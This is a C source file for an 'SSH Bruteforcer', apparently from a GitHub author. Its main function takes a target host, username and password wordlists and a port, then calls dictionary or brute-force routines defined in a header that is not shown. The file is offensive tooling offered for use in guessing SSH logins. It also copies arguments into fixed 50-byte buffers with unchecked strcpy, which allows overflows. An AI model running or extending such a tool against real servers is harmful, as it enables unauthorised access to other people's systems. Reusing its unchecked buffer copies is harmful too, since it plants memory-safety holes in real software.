/**
 *   SSH Bruteforcer
 *   Coded by: x899 (https://github.com/x899)
 *
 *   Usage: ./sshbrute -t target -uf ufile -pf pfile [-po 22 (default)] [-b]
 *
 *   Note:   1) If '-b' option is used, '-pf' option will be ignored.
 *           2) '-uf' option is mandatory.
 *           3) 22 is the default port, but can be changed using '-po' option.
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sshbrute.h"


/* Function Declaration */
static void read_file_by_line(char*, char***, int*);


/* Main Operational Function */
int main(int argc, char *argv[])
{
    char target[50];
    char username_file[50];
    char password_file[50];
    
    int brute = 0;
    int port = 22;

    if (argc < 6)
    {
        printf("Usage: ./sshbrute -t target -uf "
               "ufile [-pf pfile] [-po 22 (default)] [-b]\n");
        exit(-1);
    }

    for (int c = 1; c < argc; c++)
    {
        if (strcmp (argv[c], "-t") == 0)
        {
            c = c + 1;
            strcpy(target, argv[c]);
        }
        else if (strcmp (argv[c], "-uf") == 0)
        {
            c = c + 1;
            strcpy(username_file, argv[c]);
        }
        else if (strcmp (argv[c], "-pf") == 0)
        {
            c = c + 1;
            strcpy(password_file, argv[c]);
        }
        else if (strcmp (argv[c], "-po") == 0)
        {
            c = c + 1;
            port = atoi(argv[c]);
        }
        else if (strcmp (argv[c], "-b") == 0)
            brute = 1;
        else
        {
            printf("Usage: ./sshbrute -t target -uf ufile "
                   "-pf pfile [-po 22 (default)] [-b]\n");
            exit(-1);
        }
    }

    
    char **username = NULL;
    int username_count = 0;
    read_file_by_line(username_file, &username, &username_count);


    if (brute == 0)
    {
        char **password = NULL;
        int password_count = 0;
        read_file_by_line(password_file, &password, &password_count);
        
        ssh_dictionary(
            target, port, username, username_count, password, password_count);

        for (int i = password_count; i >= 0; i--)
            free(password[i]);
        free(password);
    }
    else
    {
        ssh_brute(target, port, username, username_count);
    }

    for (int i = username_count; i >= 0; i--)
        free(username[i]);
    free(username);
    
    return 0;
}


/**
 * Read File and store each line in array of strings
 * @param file_name name of file to read
 * @param file_data pointer to results (array of strings)
 * @param no_of_lines total number of lines in file
 */
static void
read_file_by_line(
    char* file_name,
    char ***file_data,
    int *no_of_lines)
{
    int line_allocated = 128;
	int max_line_len = 50;

    
    char **result = (char **)malloc(sizeof(char*) * line_allocated);
    if (result == NULL)
    {
        fprintf(stderr, "Out of Memory.\n");
        exit(1);
    }

	FILE* file = fopen(file_name, "r");
    if (file == NULL)
    {
        fprintf(stderr, "Unable to open file.\n");
        exit(2);
    }

    int i = 0;
    while (1)
    {
        int j;
        if (i >= line_allocated)
        {
            int new_size= line_allocated * 2;
            result = (char **)realloc(result, sizeof(char*) * new_size);
            if (result == NULL)
            {
                fprintf(stderr, "Out of Memory.\n");
                exit(3);
            }
            line_allocated = new_size;
        }

        result[i] = malloc(max_line_len);
        if (result[i] == NULL)
        {
            fprintf(stderr, "Out of Memory.\n");
            exit(3);
        }

        if (fgets(result[i], max_line_len - 1, file) == NULL)
            break;

        for(j = strlen(result[i]) - 1;
            j >= 0 && (result[i][j] == '\n' || result[i][j] == '\r');
            j--);
        result[i][j+1] = '\0';

        i++;
    }
    fclose(file);
    
    *no_of_lines = i;
    *file_data = result;
}
